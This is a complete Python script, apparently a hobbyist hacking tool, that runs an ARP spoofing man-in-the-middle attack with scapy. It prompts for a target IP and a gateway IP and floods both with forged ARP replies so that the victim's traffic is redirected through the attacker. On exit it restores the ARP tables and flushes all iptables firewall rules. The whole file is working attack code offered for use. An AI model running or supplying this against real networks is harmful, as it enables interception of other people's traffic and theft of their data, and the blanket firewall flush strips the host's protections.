import scapy.all as scapy 
from termcolor import colored
import time
import subprocess
import os

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast_MAC = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast_MAC = broadcast_MAC/arp_request
    ans_list = scapy.srp(arp_request_broadcast_MAC, timeout=5, verbose=False)[0]
    return ans_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst=mac)
    scapy.send(packet, verbose=False)

def restore(victim_ip, gateway_ip):
    restore_mac_source = get_mac(gateway_ip)
    restore_mac = get_mac(victim_ip)
    packet = scapy.ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwdst=restore_mac, hwsrc=restore_mac_source)
    scapy.send(packet, count=4, verbose=False)

count = 0 
target_ip = input(colored("[+] Enter Target IP: ", 'green', attrs=['bold']))
gateway_ip = input(colored("[+] Enter Gateway/Router IP: ", 'green', attrs=['bold']))
print(colored('\n[+] Starting ARP SPOOFER [+]', 'green', attrs=['bold']))

try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        count += 2
        print(colored('\r[+] Sent ' + str(count) + ' Packets [+]', 'green', attrs=['bold']), end="")
        time.sleep(2)

except KeyboardInterrupt:
    print(colored('\n[-] Restoring ARP Tables [-]', 'red', attrs=['bold']))
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    os.system('iptables --flush')
    print(colored('[-] Closing ARP SPOOFER [-]', 'red', attrs=['bold']))